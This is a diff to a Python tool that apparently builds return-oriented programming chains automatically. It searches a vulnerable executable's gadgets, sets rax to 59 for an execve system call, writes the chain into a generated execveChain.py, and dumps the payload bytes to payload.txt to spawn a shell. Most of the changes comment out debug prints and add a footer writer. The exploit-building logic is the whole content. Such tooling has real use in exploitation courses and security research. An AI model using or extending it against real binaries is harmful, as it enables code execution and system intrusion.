@@ -18,6 +18,8 @@ import get_gadgets
 # Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
 def execveROPChain(GadgetList, vulnExecutable): 
 
+    print("\n\n-->Chaining to get a shell using execve system call")
+
     fd = open(vulnExecutable, "rb")
     elffile = ELFFile(fd)
     data_section = ".data"
@@ -237,7 +239,8 @@ def case1(GadgetList) :
 # If syscall is present.
 def case2(GadgetList, data_section_addr) : 
 
-    print("Entering case2")
+    # print("Entering case2")
+
 
     payload = bytes()
     fd = open("execveChain.py", "w")
@@ -250,15 +253,15 @@ def case2(GadgetList, data_section_addr) :
     # movQwordGadgets = set([x for x in movQwordGadgets])
 
     movpopGadgets = canWrite(movQwordGadgets, popGadgets)
-    print(movpopGadgets)
+    # print(movpopGadgets)
     movGadget = movpopGadgets[0][0]
     popGadget1 = movpopGadgets[1][0]
     popGadget2 = movpopGadgets[2][0]
-    print("\n\n\n--------------------\n\n\n")
-    print(movGadget, popGadget1, popGadget2)
+    # print("\n\n\n--------------------\n\n\n")
+    # print(movGadget, popGadget1, popGadget2)
 
-    print("\n\n\npopGadget2\n\n\n")
-    print(popGadget2)
+    # print("\n\n\npopGadget2\n\n\n")
+    # print(popGadget2)
 
     # Put .data's address onto stack
     # Execute popGadget1 => Reg1 will have .data's address
@@ -302,7 +305,7 @@ def case2(GadgetList, data_section_addr) :
 
     # rax <- 59
     raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
-    print(raxList)
+    # print(raxList)
 
     # Search for "pop rax; ret"
     x = 0
@@ -350,7 +353,7 @@ def case2(GadgetList, data_section_addr) :
 
             # Update payload
             payload += struct.pack("<Q", int(inst['address']))
-            print("\n\n\nRAX = ", inst)
+            # print("\n\n\nRAX = ", inst)
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', ")
@@ -359,7 +362,7 @@ def case2(GadgetList, data_section_addr) :
             fd.write("\t\t# Address of 'xor rax, rax; ret'")
             fd.write("\n\t")
 
-            print("\n\n\nxor rax, rax; ret: ", inst)
+            # print("\n\n\nxor rax, rax; ret: ", inst)
 
             if changeRegValue(GadgetList, "rax", 0, 59, payload, fd) == 0: 
                 print("Unable to find gadgets which can change rax's value")
@@ -496,11 +499,16 @@ def case2(GadgetList, data_section_addr) :
     fd.write("\t\t# Address of syscall")
     fd.write("\n\t")
 
+    
+    writeFooter(fd)
+    print("-->Written the complete payload in execveChain.py")
+    print("-->Chaining successful!")
+
 
 
 def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) : 
 
-    print("Inside changeRegValue")
+    # print("Inside changeRegValue")
 
     RegArithList = categorize.queryGadgets(GadgetList, general.ARITHMETICG, Reg)
     # print(RegArithList)
@@ -515,7 +523,7 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
 
     X = 0
     while X < len(RegArithList) : 
-        print("Inside search for inc Reg")
+        # print("Inside search for inc Reg")
 
         gadget = RegArithList[X]
         inst = gadget[0]
@@ -588,7 +596,7 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
 
         if inst['mnemonic'] == "add" : 
 
-            print("\n\n\nadd rax, 1; ret", inst)
+            # print("\n\n\nadd rax, 1; ret", inst)
 
             if inst['operands'][0].isnumeric() : 
                 const = int(inst['operands'][0])
@@ -737,9 +745,16 @@ def writeHeader(fd) :
     fd.write("payload = ''")
     fd.write("\n\n\t")
 
-    
+def writeFooter(fd): 
 
-
+    fd.write("\n\t")
+    fd.write("fd = open('payload.txt', 'wb')")
+    fd.write("\n\t")
+    fd.write("fd.write(payload)")
+    fd.write("\n\t")
+    fd.write("fd.close()")    
+    fd.write("\n\t")
+    fd.close()
 
 
 
